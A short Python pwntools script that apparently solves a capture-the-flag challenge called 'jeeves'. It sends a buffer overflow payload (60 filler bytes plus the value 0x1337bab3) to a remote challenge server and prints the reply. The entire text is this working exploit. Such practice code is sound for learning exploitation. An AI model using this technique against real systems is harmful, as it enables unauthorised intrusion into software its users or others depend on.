from pwn import *

#io = process("./jeeves")
io = remote("94.237.54.50", 57487)

payload = b"A"*60 + p32(0x1337bab3)

#io.recv(1024)
io.sendline(payload)
print(io.recv(1024))

#io.sendlineafter("May I have your name? ", payload + b"\n")
#io.interactive()

